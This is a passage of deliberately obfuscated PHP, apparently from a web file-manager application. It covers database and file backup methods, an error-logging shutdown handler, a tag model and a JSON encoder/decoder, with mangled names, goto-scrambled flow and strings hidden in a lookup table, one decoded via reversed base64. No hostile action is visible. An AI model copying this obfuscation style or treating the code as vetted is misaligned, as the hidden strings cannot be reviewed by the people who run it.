(!$DôŒÛ¼é¾á->index()) { return !1; } self::set(array($F­Ù®É˜¡[702] => 1)); goto DÄ‰ßÌ¼Ê; E‚„£Ç†»: } public function dbFile() { goto dÔ¨µÏ®¦å; a­Œ¤å½Œœ: $B«êÚôÑŠ = new BackupDbFile(); if (!$B«êÚôÑŠ->index()) { return !1; } self::set(array($Ağ ¨è‹Â[703] => 1)); goto fÇ©Á…Í†; fÇ©Á…Í†: return !0; goto dëİ·ÄãÄŠ; dÔ¨µÏ®¦å: $Ağ ¨è‹Â =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $BÈ¤¯ğ¹¶ = self::get(); if ($BÈ¤¯ğ¹¶[$Ağ ¨è‹Â[278]][$Ağ ¨è‹Â[692]][$Ağ ¨è‹Â[684]] == $Ağ ¨è‹Â[83]) { return !0; } goto a­Œ¤å½Œœ; dëİ·ÄãÄŠ: } public function file() { $aîÑÙ‰Ù´ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AÎ–Øì÷— = self::get(); if ($AÎ–Øì÷—[$aîÑÙ‰Ù´[278]][$aîÑÙ‰Ù´[164]][$aîÑÙ‰Ù´[684]] == $aîÑÙ‰Ù´[83]) { return !0; } if (!isset($AÎ–Øì÷—[$aîÑÙ‰Ù´[687]]) || $AÎ–Øì÷—[$aîÑÙ‰Ù´[687]] == $aîÑÙ‰Ù´[464]) { $A‰Éº¼‚— = new BackupFile(); if (!$A‰Éº¼‚—->index()) { return !1; } } self::set(array($aîÑÙ‰Ù´[704] => 1, $aîÑÙ‰Ù´[684] => 1)); return !0; } } goto dó†Ì™¿»; c°Ù•øåƒ: function beforeShutdownError($B¤©ÒáĞ©· = false, $dÉíÀÌÈİĞ = '', $D’èÈ²ÚÑ» = '', $e©»ìšâ®Ö = 0) { $AËÅ¬ñ¬åø =& $_SERVER[Ÿ²ù¬]; switch ($B¤©ÒáĞ©·) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $FõäŠó›¨ø = $AËÅ¬ñ¬åø[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $FõäŠó›¨ø = $AËÅ¬ñ¬åø[40]; break; case E_STRICT: $FõäŠó›¨ø = $AËÅ¬ñ¬åø[41]; break; case E_NOTICE: case E_USER_NOTICE: $FõäŠó›¨ø = $AËÅ¬ñ¬åø[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $FõäŠó›¨ø = $AËÅ¬ñ¬åø[43]; break; default: break; } if (!$FõäŠó›¨ø || $FõäŠó›¨ø == $AËÅ¬ñ¬åø[42] || $FõäŠó›¨ø == $AËÅ¬ñ¬åø[43]) { return; } $D’èÈ²ÚÑ» = $AËÅ¬ñ¬åø[4] . str_replace($_SERVER[$AËÅ¬ñ¬åø[37]], $AËÅ¬ñ¬åø[20], $D’èÈ²ÚÑ»); $FëäáªŸ³ = $FõäŠó›¨ø . $AËÅ¬ñ¬åø[44] . $dÉíÀÌÈİĞ . $AËÅ¬ñ¬åø[44] . $D’èÈ²ÚÑ» . $AËÅ¬ñ¬åø[44] . $e©»ìšâ®Ö; write_log($FëäáªŸ³ . $AËÅ¬ñ¬åø[18] . get_caller_msg(1), $AËÅ¬ñ¬åø[19]); } $_SERVER[$_SERVER[Ÿ²ù¬][45]] = $_SERVER[$_SERVER[Ÿ²ù¬][37]] . $_SERVER[Ÿ²ù¬][46]; $EîïİÔÕ— = strrev(base64_decode($_SERVER[Ÿ²ù¬][47])); goto F™¸¼¯Š“¦; aŒ§’§óò»: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\162\56\x74\141\x67\114\x69\163\164"; public $modelType = "\125\x73\x65\x72\117\x70\x74\151\157\x6e"; public $field = array("\156\141\155\x65", "\163\x74\x79\154\x65", "\163\157\x72\x74"); public function listData($eÀ‹¦Ê×³â = false, $dÍƒê÷äé = "\163\157\x72\164", $cÔê¼ä§Œ = false) { return parent::listData($eÀ‹¦Ê×³â, $dÍƒê÷äé, $cÔê¼ä§Œ); } public function remove($AÒù“ßÚÕî) { return parent::remove($AÒù“ßÚÕî); } public function add($dåˆƒ¢¥Œ‡, $c¬ì”Ø÷÷Ç = "\154\x61\x62\145\154\55\x67\162\x65\171\55\156\x6f\x72\x6d\141\x6c") { $eà©—Ä¢ÊÈ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if ($this->findByName($dåˆƒ¢¥Œ‡)) { return !1; } $e¢áˆŸ……Æ = array($eà©—Ä¢ÊÈ[383] => $dåˆƒ¢¥Œ‡, $eà©—Ä¢ÊÈ[433] => $c¬ì”Ø÷÷Ç, $eà©—Ä¢ÊÈ[2076] => $this->getSort($eà©—Ä¢ÊÈ[243]) + 1); return parent::insert($e¢áˆŸ……Æ); } public function update($Câ†¦¹æ, $C¨˜ëö†‚§) { $D„‡‹íˆÔ¥ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $d˜äç‹ê‹ = $this->listData($Câ†¦¹æ); $aÇ§Å¬Ñğ = $this->findByName($C¨˜ëö†‚§[$D„‡‹íˆÔ¥[28]]); if (!$d˜äç‹ê‹ || $aÇ§Å¬Ñğ && $aÇ§Å¬Ñğ[$D„‡‹íˆÔ¥[364]] != $d˜äç‹ê‹[$D„‡‹íˆÔ¥[364]]) { return !1; } return parent::update($Câ†¦¹æ, $C¨˜ëö†‚§); } public function moveTop($b‚«àâ˜Ï) { $e±ÅÓÙ½‘å =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $aö÷Ò‚éºÇ = parent::listData(); $c­…¼…æÎ© = $this->getSort($e±ÅÓÙ½‘å[242]); foreach ($aö÷Ò‚éºÇ as &$fáº†Õª…‘) { if ($fáº†Õª…‘[$e±ÅÓÙ½‘å[364]] == $b‚«àâ˜Ï) { $fáº†Õª…‘[$e±ÅÓÙ½‘å[2093]] = $c­…¼…æÎ©; continue; } $fáº†Õª…‘[$e±ÅÓÙ½‘å[2093]] += 1; } return parent::resetData($aö÷Ò‚éºÇ); } public function moveBottom($aåÜŠ‰Úª) { $Bİ§éøİ„˜ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $bã¿‹â”Ê = $this->getSort($Bİ§éøİ„˜[243]) + 1; return parent::update($aåÜŠ‰Úª, array($Bİ§éøİ„˜[2093] => $bã¿‹â”Ê)); } public function resetSort($cÌ¬‰†µ ) { goto F”·–‘; F¦ˆÂ±æ½İ: for ($EÁÈ¨ğàÓè = 0; $EÁÈ¨ğàÓè < count($cÌ¬‰†µ ); $EÁÈ¨ğàÓè++) { $eé…Š‹Š¤[$cÌ¬‰†µ [$EÁÈ¨ğàÓè] . $c†çÚÑñä±[33]] = $EÁÈ¨ğàÓè + 1; } $aÚ¨—ª¾ = parent::listData(); foreach ($aÚ¨—ª¾ as &$A†¸ßš‡Ö²) { $bÈ‘ĞÁ©÷ = $eé…Š‹Š¤[$A†¸ßš‡Ö²[$c†çÚÑñä±[364]]]; $A†¸ßš‡Ö²[$c†çÚÑñä±[2093]] = $bÈ‘ĞÁ©÷ ? $bÈ‘ĞÁ©÷ : $A†¸ßš‡Ö²[$c†çÚÑñä±[2093]]; } goto b³‹¥ó²¶; b³‹¥ó²¶: return parent::resetData($aÚ¨—ª¾); goto bãÂØˆåÊ¿; F”·–‘: $c†çÚÑñä± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eé…Š‹Š¤ = array(); $cÌ¬‰†µ  = is_array($cÌ¬‰†µ ) ? $cÌ¬‰†µ  : array(); goto F¦ˆÂ±æ½İ; bãÂØˆåÊ¿: } private function getSort($a¸êÁ´Ãá‹) { $A‡Ê‹–ôŒ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A¸ÆíìÄÂ = parent::listData(); $cøÁçÜëƒ£ = array_to_keyvalue($A¸ÆíìÄÂ, $A‡Ê‹–ôŒ[33], $A‡Ê‹–ôŒ[2093]); if (!$cøÁçÜëƒ£) { $cøÁçÜëƒ£ = array(0); } $Aõ¸Íôµ‹— = $a¸êÁ´Ãá‹ == $A‡Ê‹–ôŒ[243] ? max($cøÁçÜëƒ£) : min($cøÁçÜëƒ£); return intval($Aõ¸Íôµ‹—); } } goto D½†¦…³­á; C®êÂ¥Œí¥: define($_SERVER[ÚŠ•´ÍéÒÑÔ][1906], 32); class Services_JSON { function __construct($DÙÅò™Ìéì = 0) { $this->use = $DÙÅò™Ìéì; } function utf162utf8($aš´­¨•ê†) { $EÕµÜ°†£» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (function_exists($EÕµÜ°†£»[68])) { return mb_convert_encoding($aš´­¨•ê†, $EÕµÜ°†£»[1558], $EÕµÜ°†£»[1907]); } $d›øä¸’°½ = ord($aš´­¨•ê†[0]) << 8 | ord($aš´­¨•ê†[1]); switch (!0) { case (127 & $d›øä¸’°½) == $d›øä¸’°½: return chr(127 & $d›øä¸’°½); case (2047 & $d›øä¸’°½) == $d›øä¸’°½: return chr(192 | $d›øä¸’°½ >> 6 & 31) . chr(128 | $d›øä¸’°½ & 63); case (65535 & $d›øä¸’°½) == $d›øä¸’°½: return chr(224 | $d›øä¸’°½ >> 12 & 15) . chr(128 | $d›øä¸’°½ >> 6 & 63) . chr(128 | $d›øä¸’°½ & 63); } return $EÕµÜ°†£»[33]; } function utf82utf16($Aøà¹“„†) { $Dè‡º©Ò“‘ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (function_exists($Dè‡º©Ò“‘[68])) { return mb_convert_encoding($Aøà¹“„†, $Dè‡º©Ò“‘[1907], $Dè‡º©Ò“‘[1558]); } switch (strlen($Aøà¹“„†)) { case 1: return $Aøà¹“„†; case 2: return chr(7 & ord($Aøà¹“„†[0]) >> 2) . chr(192 & ord($Aøà¹“„†[0]) << 6 | 63 & ord($Aøà¹“„†[1])); case 3: return chr(240 & ord($Aøà¹“„†[0]) << 4 | 15 & ord($Aøà¹“„†[1]) >> 2) . chr(192 & ord($Aøà¹“„†[1]) << 6 | 127 & ord($Aøà¹“„†[2])); } return $Dè‡º©Ò“‘[33]; } function encode($E¢ìÜµ”ñ¤) { $Eõñ³‘Å”» =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; switch (gettype($E¢ìÜµ”ñ¤)) { case $Eõñ³‘Å”»[1569]: return $E¢ìÜµ”ñ¤ ? $Eõñ³‘Å”»[1568] : $Eõñ³‘Å”»[1570]; case $Eõñ³‘Å”»[1908]: return $Eõñ³‘Å”»[101]; case $Eõñ³‘Å”»[300]: return (int) $E¢ìÜµ”ñ¤; case $Eõñ³‘Å”»[275]: case $Eõñ³‘Å”»[274]: return (double) $E¢ìÜµ”ñ¤; case $Eõñ³‘Å”»[309]: $a”ÖòğÃâã = $Eõñ³‘Å”»[33]; $Dõ â´“†æ = strlen($E¢ìÜµ”ñ¤); for ($a–²Ô®‰šƒ = 0; $a–²Ô®‰šƒ < $Dõ â´“†æ; ++$a–²Ô®‰šƒ) { $AÖ´èÓ³—– = ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ]); switch (!0) { case $AÖ´èÓ³—– == 8: $a”ÖòğÃâã .= $Eõñ³‘Å”»[1909]; break; case $AÖ´èÓ³—– == 9: $a”ÖòğÃâã .= $Eõñ³‘Å”»[1545]; break; case $AÖ´èÓ³—– == 10: $a”ÖòğÃâã .= $Eõñ³‘Å”»[1543]; break; case $AÖ´èÓ³—– == 12: $a”ÖòğÃâã .= $Eõñ³‘Å”»[1910]; break; case $AÖ´èÓ³—– == 13: $a”ÖòğÃâã .= $Eõñ³‘Å”»[1544]; break; case $AÖ´èÓ³—– == 34: case $AÖ´èÓ³—– == 47: case $AÖ´èÓ³—– == 92: $a”ÖòğÃâã .= $Eõñ³‘Å”»[95] . $E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ]; break; case $AÖ´èÓ³—– >= 32 && $AÖ´èÓ³—– <= 127: $a”ÖòğÃâã .= $E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ]; break; case ($AÖ´èÓ³—– & 224) == 192: $F‚áîƒ¶ÄÓ = pack($Eõñ³‘Å”»[1911], $AÖ´èÓ³—–, ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 1])); $a–²Ô®‰šƒ += 1; $dí­ÇÜ¨ñŞ = $this->utf82utf16($F‚áîƒ¶ÄÓ); $a”ÖòğÃâã .= sprintf($Eõñ³‘Å”»[1912], bin2hex($dí­ÇÜ¨ñŞ)); break; case ($AÖ´èÓ³—– & 240) == 224: $F‚áîƒ¶ÄÓ = pack($Eõñ³‘Å”»[1911], $AÖ´èÓ³—–, ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 1]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 2])); $a–²Ô®‰šƒ += 2; $dí­ÇÜ¨ñŞ = $this->utf82utf16($F‚áîƒ¶ÄÓ); $a”ÖòğÃâã .= sprintf($Eõñ³‘Å”»[1912], bin2hex($dí­ÇÜ¨ñŞ)); break; case ($AÖ´èÓ³—– & 248) == 240: $F‚áîƒ¶ÄÓ = pack($Eõñ³‘Å”»[1911], $AÖ´èÓ³—–, ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 1]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 2]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 3])); $a–²Ô®‰šƒ += 3; $dí­ÇÜ¨ñŞ = $this->utf82utf16($F‚áîƒ¶ÄÓ); $a”ÖòğÃâã .= sprintf($Eõñ³‘Å”»[1912], bin2hex($dí­ÇÜ¨ñŞ)); break; case ($AÖ´èÓ³—– & 252) == 248: $F‚áîƒ¶ÄÓ = pack($Eõñ³‘Å”»[1911], $AÖ´èÓ³—–, ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 1]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 2]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 3]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 4])); $a–²Ô®‰šƒ += 4; $dí­ÇÜ¨ñŞ = $this->utf82utf16($F‚áîƒ¶ÄÓ); $a”ÖòğÃâã .= sprintf($Eõñ³‘Å”»[1912], bin2hex($dí­ÇÜ¨ñŞ)); break; case ($AÖ´èÓ³—– & 254) == 252: $F‚áîƒ¶ÄÓ = pack($Eõñ³‘Å”»[1911], $AÖ´èÓ³—–, ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 1]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 2]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 3]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 4]), ord($E¢ìÜµ”ñ¤[$a–²Ô®‰šƒ + 5])); $a–²Ô®‰šƒ += 5; $dí­ÇÜ¨ñŞ = $this->utf82utf16($F‚áîƒ¶ÄÓ); $a”ÖòğÃâã .= sprintf($Eõñ³‘Å”»[1912], bin2hex($dí­ÇÜ¨ñŞ)); break; } } return $Eõñ³‘Å”»[113] . $a”ÖòğÃâã . $Eõñ³‘Å”»[113]; case $Eõñ³‘Å”»[1913]: if (is_array($E¢ìÜµ”ñ¤) && count($E¢ìÜµ”ñ¤) && array_keys($E¢ìÜµ”ñ¤) !== range(0, sizeof($E¢ìÜµ”ñ¤) - 1)) { $EÑÈ¾áª¥î = array_map(array($this, $Eõñ³‘Å”»[1914]), array_keys($E¢ìÜµ”ñ¤), array_values($E¢ìÜµ”ñ¤)); foreach ($EÑÈ¾áª¥î as $a„½ó“Íáâ) { if (Services_JSON::isError($a„½ó“Íáâ)) { return $a„½ó“Íáâ; } } return $Eõñ³‘Å”»[1060] . join($Eõñ³‘Å”»[47], $EÑÈ¾áª¥î) . $Eõñ³‘Å”»[312]; } $Eª®µ‰í±À = array_map(array($this, $Eõñ³‘Å”»[1915]), $E¢ìÜµ”ñ¤); foreach ($Eª®µ‰í±À as $EÁ‰¤ÈÅ ) { if (Services_JSON::isError($EÁ‰¤ÈÅ )) { return $EÁ‰¤ÈÅ ; } } return $Eõñ³‘Å”»[154] . join($Eõñ³‘Å”»[47], $Eª®µ‰í±À) . $Eõñ³‘Å”»[472]; case $Eõñ³‘Å”»[1916]: $eÈ£‡ÂÏô± = get_object_vars($E¢ìÜµ”ñ¤); $EÑÈ¾áª¥î = array_map(array($this, $Eõñ³‘Å”»[1914]), array_keys($eÈ£‡ÂÏô±), array_values($eÈ£‡ÂÏô±)); foreach ($EÑÈ¾áª¥î as $a„½ó“Íáâ) { if (Services_JSON::isError($a„½ó“Íáâ)) { return $a„½ó“Íáâ; } } return $Eõñ³‘Å”»[1060] . join($Eõñ³‘Å”»[47], $EÑÈ¾áª¥î) . $Eõñ³‘Å”»[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $Eõñ³‘Å”»[101] : new Services_JSON_Error(gettype($E¢ìÜµ”ñ¤) . $Eõñ³‘Å”»[1917]); } } function name_value($bÑÙ£ìÙÑÀ, $dšŞ‡ôÔˆ) { $FóƒÌ½„È = $this->encode($dšŞ‡ôÔˆ); if (Services_JSON::isError($FóƒÌ½„È)) { return $FóƒÌ½„È; } return $this->encode(strval($bÑÙ£ìÙÑÀ)) . $_SERVER[ÚŠ•´ÍéÒÑÔ][4] . $FóƒÌ½„È; } function reduce_string($b…èÏ‰Ò¸’) { $d¶ˆ±¸ùŠñ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $b…èÏ‰Ò¸’ = preg_replace(array($d¶ˆ±¸ùŠñ[1918], $d¶ˆ±¸ùŠñ[1919], $d¶ˆ±¸ùŠñ[1920]), $d¶ˆ±¸ùŠñ[33], $b…èÏ‰Ò¸’); return trim($b…èÏ‰Ò¸’); } function decode($a¢®‚ìñğó) { $e‘¿¢÷™† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $a¢®‚ìñğó = $this->reduce_string($a¢®‚ìñğó); switch (strtolower($a¢®‚ìñğó)) { case $e‘¿¢÷™†[1568]: return !0; case $e‘¿¢÷™†[1570]: return !1; case $e‘¿¢÷™†[101]: return null; default: $F‰Ú…³¢¥ë = array(); if (is_numeric($a¢®‚ìñğó)) { return (double) $a¢®‚ìñğó == (int) $a¢®‚ìñğó ? (int) $a¢®‚ìñğó : (double) $a¢®‚ìñğó; } elseif (preg_match($e‘¿¢÷™†[1921], $a¢®‚ìñğó, $F‰Ú…³¢¥ë) && $F‰Ú…³¢¥ë[1] == $F‰Ú…³¢¥ë[2]) { $fÅâÓÃôèÆ = substr($a¢®‚ìñğó, 0, 1); $c­¥¤÷ÛŒ = substr($a¢®‚ìñğó, 1, -1); $F–Âòá±— = $e‘¿¢÷™†[33]; $A©²•·§‘ = strlen($c­¥¤÷ÛŒ); for ($f¾®Ÿ”òÚ = 0; $f¾®Ÿ”òÚ < $A©²•·§‘; ++$f¾®Ÿ”òÚ) { $C³ÃˆÜ’™¨ = substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ, 2); $FÍÄÃƒ–›‰ = ord($c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ]); switch (!0) { case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1909]: $F–Âòá±— .= chr(8); ++$f¾®Ÿ”òÚ; break; case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1545]: $F–Âòá±— .= chr(9); ++$f¾®Ÿ”òÚ; break; case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1543]: $F–Âòá±— .= chr(10); ++$f¾®Ÿ”òÚ; break; case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1910]: $F–Âòá±— .= chr(12); ++$f¾®Ÿ”òÚ; break; case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1544]: $F–Âòá±— .= chr(13); ++$f¾®Ÿ”òÚ; break; case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1328]: case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1922]: case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1538]: case $C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1540]: if ($fÅâÓÃôèÆ == $e‘¿¢÷™†[113] && $C³ÃˆÜ’™¨ != $e‘¿¢÷™†[1922] || $fÅâÓÃôèÆ == $e‘¿¢÷™†[55] && $C³ÃˆÜ’™¨ != $e‘¿¢÷™†[1328]) { $F–Âòá±— .= $c­¥¤÷ÛŒ[++$f¾®Ÿ”òÚ]; } break; case preg_match($e‘¿¢÷™†[1923], substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ, 6)): $CÓƒ‹ÑÕ·ğ = chr(hexdec(substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ + 2, 2))) . chr(hexdec(substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ + 4, 2))); $F–Âòá±— .= $this->utf162utf8($CÓƒ‹ÑÕ·ğ); $f¾®Ÿ”òÚ += 5; break; case $FÍÄÃƒ–›‰ >= 32 && $FÍÄÃƒ–›‰ <= 127: $F–Âòá±— .= $c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ]; break; case ($FÍÄÃƒ–›‰ & 224) == 192: $F–Âòá±— .= substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ, 2); ++$f¾®Ÿ”òÚ; break; case ($FÍÄÃƒ–›‰ & 240) == 224: $F–Âòá±— .= substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ, 3); $f¾®Ÿ”òÚ += 2; break; case ($FÍÄÃƒ–›‰ & 248) == 240: $F–Âòá±— .= substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ, 4); $f¾®Ÿ”òÚ += 3; break; case ($FÍÄÃƒ–›‰ & 252) == 248: $F–Âòá±— .= substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ, 5); $f¾®Ÿ”òÚ += 4; break; case ($FÍÄÃƒ–›‰ & 254) == 252: $F–Âòá±— .= substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ, 6); $f¾®Ÿ”òÚ += 5; break; } } return $F–Âòá±—; } elseif (preg_match($e‘¿¢÷™†[1924], $a¢®‚ìñğó) || preg_match($e‘¿¢÷™†[1925], $a¢®‚ìñğó)) { goto EÁ§‚³‹çÖ; EÁ§‚³‹çÖ: if ($a¢®‚ìñğó[0] == $e‘¿¢÷™†[154]) { $E¹Õ”İù = array(SERVICES_JSON_IN_ARR); $CŞ¯”¿´Ê = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $E¹Õ”İù = array(SERVICES_JSON_IN_OBJ); $a’Ö£¤§’ = array(); } else { $E¹Õ”İù = array(SERVICES_JSON_IN_OBJ); $a’Ö£¤§’ = new stdClass(); } } array_push($E¹Õ”İù, array($e‘¿¢÷™†[1926] => SERVICES_JSON_SLICE, $e‘¿¢÷™†[260] => 0, $e‘¿¢÷™†[1927] => !1)); $c­¥¤÷ÛŒ = substr($a¢®‚ìñğó, 1, -1); goto fµ—¥ºàØÄ; fµ—¥ºàØÄ: $c­¥¤÷ÛŒ = $this->reduce_string($c­¥¤÷ÛŒ); if ($c­¥¤÷ÛŒ == $e‘¿¢÷™†[33]) { if (reset($E¹Õ”İù) == SERVICES_JSON_IN_ARR) { return $CŞ¯”¿´Ê; } else { return $a’Ö£¤§’; } } $A©²•·§‘ = strlen($c­¥¤÷ÛŒ); goto b‡£õêĞÅ; b‡£õêĞÅ: for ($f¾®Ÿ”òÚ = 0; $f¾®Ÿ”òÚ <= $A©²•·§‘; ++$f¾®Ÿ”òÚ) { $d¦Ò¨¤“ìí = end($E¹Õ”İù); $C³ÃˆÜ’™¨ = substr($c­¥¤÷ÛŒ, $f¾®Ÿ”òÚ, 2); if ($f¾®Ÿ”òÚ == $A©²•·§‘ || $c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ] == $e‘¿¢÷™†[47] && $d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]] == SERVICES_JSON_SLICE) { $cØ‡…©Û¥É = substr($c­¥¤÷ÛŒ, $d¦Ò¨¤“ìí[$e‘¿¢÷™†[260]], $f¾®Ÿ”òÚ - $d¦Ò¨¤“ìí[$e‘¿¢÷™†[260]]); array_push($E¹Õ”İù, array($e‘¿¢÷™†[1926] => SERVICES_JSON_SLICE, $e‘¿¢÷™†[260] => $f¾®Ÿ”òÚ + 1, $e‘¿¢÷™†[1927] => !1)); if (reset($E¹Õ”İù) == SERVICES_JSON_IN_ARR) { array_push($CŞ¯”¿´Ê, $this->decode($cØ‡…©Û¥É)); } elseif (reset($E¹Õ”İù) == SERVICES_JSON_IN_OBJ) { $c“‘ Èè¹ = array(); if (preg_match($e‘¿¢÷™†[1928], $cØ‡…©Û¥É, $c“‘ Èè¹)) { $Eˆ……ƒÙ£ = $this->decode($c“‘ Èè¹[1]); $DÇ¦ô¶™œó = $this->decode($c“‘ Èè¹[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a’Ö£¤§’[$Eˆ……ƒÙ£] = $DÇ¦ô¶™œó; } else { $a’Ö£¤§’->{$Eˆ……ƒÙ£} = $DÇ¦ô¶™œó; } } elseif (preg_match($e‘¿¢÷™†[1929], $cØ‡…©Û¥É, $c“‘ Èè¹)) { $Eˆ……ƒÙ£ = $c“‘ Èè¹[1]; $DÇ¦ô¶™œó = $this->decode($c“‘ Èè¹[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $a’Ö£¤§’[$Eˆ……ƒÙ£] = $DÇ¦ô¶™œó; } else { $a’Ö£¤§’->{$Eˆ……ƒÙ£} = $DÇ¦ô¶™œó; } } } } elseif (($c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ] == $e‘¿¢÷™†[113] || $c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ] == $e‘¿¢÷™†[55]) && $d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]] != SERVICES_JSON_IN_STR) { array_push($E¹Õ”İù, array($e‘¿¢÷™†[1926] => SERVICES_JSON_IN_STR, $e‘¿¢÷™†[260] => $f¾®Ÿ”òÚ, $e‘¿¢÷™†[1927] => $c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ])); } elseif ($c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ] == $d¦Ò¨¤“ìí[$e‘¿¢÷™†[1927]] && $d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]] == SERVICES_JSON_IN_STR && (strlen(substr($c­¥¤÷ÛŒ, 0, $f¾®Ÿ”òÚ)) - strlen(rtrim(substr($c­¥¤÷ÛŒ, 0, $f¾®Ÿ”òÚ), $e‘¿¢÷™†[95]))) % 2 != 1) { array_pop($E¹Õ”İù); } elseif ($c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ] == $e‘¿¢÷™†[154] && in_array($d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E¹Õ”İù, array($e‘¿¢÷™†[1926] => SERVICES_JSON_IN_ARR, $e‘¿¢÷™†[260] => $f¾®Ÿ”òÚ, $e‘¿¢÷™†[1927] => !1)); } elseif ($c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ] == $e‘¿¢÷™†[472] && $d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]] == SERVICES_JSON_IN_ARR) { array_pop($E¹Õ”İù); } elseif ($c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ] == $e‘¿¢÷™†[1060] && in_array($d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E¹Õ”İù, array($e‘¿¢÷™†[1926] => SERVICES_JSON_IN_OBJ, $e‘¿¢÷™†[260] => $f¾®Ÿ”òÚ, $e‘¿¢÷™†[1927] => !1)); } elseif ($c­¥¤÷ÛŒ[$f¾®Ÿ”òÚ] == $e‘¿¢÷™†[312] && $d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]] == SERVICES_JSON_IN_OBJ) { array_pop($E¹Õ”İù); } elseif ($C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1930] && in_array($d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($E¹Õ”İù, array($e‘¿¢÷™†[1926] => SERVICES_JSON_IN_CMT, $e‘¿¢÷™†[260] => $f¾®Ÿ”òÚ, $e‘¿¢÷™†[1927] => !1)); $f¾®Ÿ”òÚ++; } elseif ($C³ÃˆÜ’™¨ == $e‘¿¢÷™†[1931] && $d¦Ò¨¤“ìí[$e‘¿¢÷™†[1926]] == SERVICES_JSON_IN_CMT) { array_pop($E¹Õ”İù); $f¾®Ÿ”òÚ++; for ($a¦¯¶¶œí = $d¦Ò¨¤“ìí[$e‘¿¢÷™†[260]]; $a¦¯¶¶œí <= $f¾®Ÿ”òÚ; ++$a¦¯¶¶œí) { $c­¥¤÷ÛŒ = substr_replace($c­¥¤÷ÛŒ, $e‘¿¢÷™†[50], $a¦¯¶¶œí, 1); } } } if (reset($E¹Õ”İù) == SERVICES_JSON_IN_ARR) { return $CŞ¯”¿´Ê; } elseif (reset($E¹Õ”İù) == SERVICES_JSON_IN_OBJ) { return $a’Ö£¤§’; } goto D«°æ†¶Æ; D«°æ†¶Æ: } } } function isError($B‡„ÂÁä×³, $EøÛÖí«°å = null) { $EÑÍ½ÃÅ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if 